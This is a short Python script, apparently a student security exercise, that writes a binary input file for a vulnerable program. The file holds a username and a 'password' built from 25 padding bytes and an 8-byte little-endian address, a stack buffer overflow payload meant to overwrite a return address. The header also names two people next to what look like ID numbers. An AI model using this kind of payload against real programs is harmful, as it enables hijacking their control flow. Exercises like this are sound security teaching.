# // alamin masharqa 207358326            adan fadila 314705062 

username = b"amin\n"
password = b"A" * 25 + b"\x29\x52\x55\x55\x55\x55\x00\x00" 

with open("combined_input_show.bin", "wb") as f:
    f.write(username + password)
